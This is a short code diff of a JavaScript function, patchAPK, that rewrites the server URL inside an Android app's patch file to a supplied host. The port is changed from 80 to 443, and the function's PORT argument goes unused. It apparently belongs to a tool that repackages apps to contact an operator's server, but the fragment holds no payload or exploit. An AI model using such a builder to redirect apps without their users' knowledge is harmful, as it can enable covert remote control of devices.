@@ -25,7 +25,7 @@ function patchAPK(URI, PORT, cb) {
         fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
             if (err) return cb('File Patch Error - READ')
             var result = data.replace(data.substring(data.indexOf("https://"), data.indexOf("?model=")), 
-"https://" + URI + ":" + "80");
+"https://" + URI + ":" + "443");
             fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                 if (err) return cb('File Patch Error - WRITE')
                 else return cb(false)
